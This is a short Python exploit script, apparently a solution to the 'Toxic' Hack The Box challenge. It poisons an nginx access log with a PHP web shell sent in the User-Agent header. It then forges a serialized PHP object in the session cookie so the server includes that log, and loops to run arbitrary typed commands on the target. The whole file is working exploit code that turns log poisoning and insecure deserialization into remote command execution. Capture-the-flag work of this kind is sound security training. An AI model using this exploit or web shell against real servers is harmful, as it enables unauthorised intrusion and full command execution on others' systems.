#!/usr/bin/python3
# Toxic challenge | HTB
# Author : Hussien Misbah
# LFI thorugh deserialization
 
import requests
import base64
import sys

headers = {'User-Agent': "<?php system($_GET['cmd']); ?>" }

url = "http://206.189.117.166:31290"
logs_path  ="/var/log/nginx/access.log"
flag = False 
while 1 :
    if flag is False:
        try :
            r = requests.get(url,headers = headers)
        except :
            print('[!] make sure host is up')
            sys.exit(-1)
        flag = True
    command = input("#")
    cookie = f'O:9:"PageModel":1:{{s:4:"file";s:{len(logs_path)}:"{logs_path}";}}'
    cookie = base64.b64encode(cookie.encode('utf-8'))
    send_cookie ={}
    send_cookie['PHPSESSID']=cookie.decode('utf-8')
    r = requests.get(url+f"?cmd={command}", cookies=send_cookie)
    print(r.text)
